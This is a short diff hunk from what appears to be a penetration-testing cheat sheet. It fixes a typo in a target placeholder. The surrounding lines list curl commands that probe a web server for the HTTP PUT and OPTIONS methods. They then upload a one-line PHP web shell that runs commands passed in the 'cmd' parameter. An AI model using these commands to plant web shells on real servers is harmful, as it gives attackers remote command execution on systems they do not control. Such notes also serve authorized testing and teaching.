@@ -260,7 +260,7 @@ Step 2:
 curl -i -L INSERTIPADDRESS
 
 # Check if it is possible to upload using put
-curl --user login:password --upload-file your.file.txt http://INSERTIPADDRES
+curl --user login:password --upload-file your.file.txt http://INSERTIPADDRESS
 curl -v -X OPTIONS http://INSERTIPADDRESS/
 curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://INSERTIPADDRESS/test/shell.php
 
